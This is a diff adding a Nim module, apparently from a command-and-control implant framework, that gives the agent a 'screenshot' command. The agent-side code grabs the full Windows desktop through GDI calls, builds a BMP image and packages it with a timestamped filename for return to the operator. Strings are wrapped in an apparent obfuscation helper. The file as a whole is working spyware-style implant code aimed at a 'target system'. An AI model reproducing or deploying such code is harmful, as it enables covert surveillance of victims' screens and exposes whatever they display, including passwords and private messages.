@@ -1,0 +1,151 @@
+import ../common/[types, utils]
+
+# Define function prototype
+proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult 
+
+# Command definition (as seq[Command])
+let commands*: seq[Command] =  @[
+    Command(
+        name: protect("screenshot"),
+        commandType: CMD_SCREENSHOT,
+        description: protect("Take a screenshot of the target system."),
+        example: protect("screenshot"),
+        arguments: @[],
+        execute: executeScreenshot
+    )
+]
+
+# Implement execution functions
+when defined(server):
+    proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult = nil
+
+when defined(agent):
+
+    import winim/lean
+    import winim/inc/wingdi
+    import strutils, strformat, times
+    import ../agent/protocol/result
+    import ../common/[utils, serialize]
+    
+    proc takeScreenshot(): seq[byte] = 
+        
+        var
+            screenshotLength: ULONG 
+            screenshotBytes: PVOID
+
+            bmpFileHeader: BITMAPFILEHEADER
+            bmpInfoHeader: BITMAPINFOHEADER
+            bmpInfo: BITMAPINFO 
+            desktop: BITMAP 
+            deviceCtx: HDC 
+            memDeviceCtx: HDC 
+            bmpSection: HBITMAP 
+            gdiCurrent: HGDIOBJ
+            gdiObject: HGDIOBJ 
+            resX: INT 
+            resY: INT 
+            bitsLength: ULONG 
+            bitsBuffer: PVOID 
+        
+        zeroMem(addr bmpFileHeader, sizeof(BITMAPFILEHEADER))
+        zeroMem(addr bmpInfoHeader, sizeof(BITMAPINFOHEADER))
+        zeroMem(addr bmpInfo, sizeof(BITMAPINFO))
+        zeroMem(addr desktop, sizeof(BITMAP))
+
+        # Retrieve system resolution 
+        resX = GetSystemMetrics(SM_XVIRTUALSCREEN)
+        resY = GetSystemMetrics(SM_YVIRTUALSCREEN)
+
+        # Obtain handle to the device context for the entire screen
+        deviceCtx = GetDC(0)
+        if deviceCtx == 0: 
+            raise newException(CatchableError, $GetLastError())
+        defer: ReleaseDC(0, deviceCtx)
+
+        # Fetch BITMAP structure using GetCurrentObject and GetObjectW
+        gdiCurrent = GetCurrentObject(deviceCtx, OBJ_BITMAP)
+        if gdiCurrent == 0: 
+            raise newException(CatchableError, $GetLastError())
+        defer: DeleteObject(gdiCurrent)
+
+        if GetObjectW(gdiCurrent, ULONG(sizeof(BITMAP)), addr desktop) == 0: 
+            raise newException(CatchableError, $GetLastError())
+
+        # Construct BMP headers
+        # Calculate amount of bits required to represent screenshot
+        bitsLength = ((( 24 * desktop.bmWidth + 31) and not 31) div 8) * desktop.bmHeight
+
+        bmpFileHeader.bfType = 0x4D42 # Signature of the BMP file, "BM"
+        bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)
+        bmpFileHeader.bfSize =  sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bitsLength
+
+        bmpInfoHeader.biSize = ULONG(sizeof(BITMAPINFOHEADER))
+        bmpInfoHeader.biBitCount = 24                       # Color depth (same as defined in the formula above)
+        bmpInfoHeader.biCompression = BI_RGB                # uncompressed RGB format
+        bmpInfoHeader.biPlanes = 1                          # Number of color planes, always set to 1
+        bmpInfoHeader.biWidth = desktop.bmWidth             # Width of the bitmap image
+        bmpInfoHeader.biHeight = desktop.bmHeight           # Height of the bitmap image
+
+        # Size calculation and memory allocation
+        screenshotLength = bmpFileHeader.bfSize
+        screenshotBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, screenshotLength)
+        if screenshotBytes == NULL: 
+            raise newException(CatchableError, $GetLastError())
+        defer: HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, screenshotBytes)
+
+        # Assembly the bitmap image 
+        memDeviceCtx = CreateCompatibleDC(deviceCtx)
+        if memDeviceCtx == 0: 
+            raise newException(CatchableError, $GetLastError())
+        defer: ReleaseDC(0, memDeviceCtx)
+        
+        # Initialize BITMAPINFO with prepared info header
+        bmpInfo.bmiHeader = bmpInfoHeader
+
+        bmpSection = CreateDIBSection(deviceCtx, addr bmpInfo, DIB_RGB_COLORS, addr bitsBuffer, cast[HANDLE](NULL), 0) 
+        if bmpSection == 0 or bitsBuffer == NULL: 
+            raise newException(CatchableError, $GetLastError())
+    
+        # Select the newly created bitmap into the memory device context
+        gdiObject = SelectObject(memDeviceCtx, bmpSection)
+        if gdiObject == 0: 
+            raise newException(CatchableError, $GetLastError())
+        defer: DeleteObject(gdiObject)
+
+        # Copy the screen content from the source device context to the memory device context
+        if BitBlt(
+            memDeviceCtx,                           # Destination device context
+            0, 0,                                   # Destination coordinates
+            desktop.bmWidth, desktop.bmHeight,      # Dimensions of the area to copy
+            deviceCtx,                              # Source device context
+            resX, resY,                             # Source coordinates
+            SRCCOPY                                 # Copy source directly to destination
+        ) == 0: 
+            raise newException(CatchableError, $GetLastError())
+
+        # Return the screenshot as a seq[byte]
+        result = newSeq[byte](screenshotLength)
+        copyMem(addr result[0], addr bmpFileHeader, sizeof(BITMAPFILEHEADER))
+        copyMem(addr result[sizeof(BITMAPFILEHEADER)], addr bmpInfoHeader, sizeof(BITMAPINFOHEADER))
+        copyMem(addr result[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)], bitsBuffer, bitsLength)
+
+    proc executeScreenshot(ctx: AgentCtx, task: Task): TaskResult = 
+        try: 
+
+            echo protect("    [>] Taking and uploading screenshot.")
+
+            let
+                screenshotFilename: string = fmt"screenshot_{getTime().toUnix()}.bmp"
+                screenshotBytes: seq[byte] = takeScreenshot() 
+
+            var packer = Packer.init() 
+
+            packer.addDataWithLengthPrefix(string.toBytes(screenshotFilename))
+            packer.addDataWithLengthPrefix(screenshotBytes)
+
+            let data = packer.pack() 
+
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_BINARY, data)
+
+        except CatchableError as err: 
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
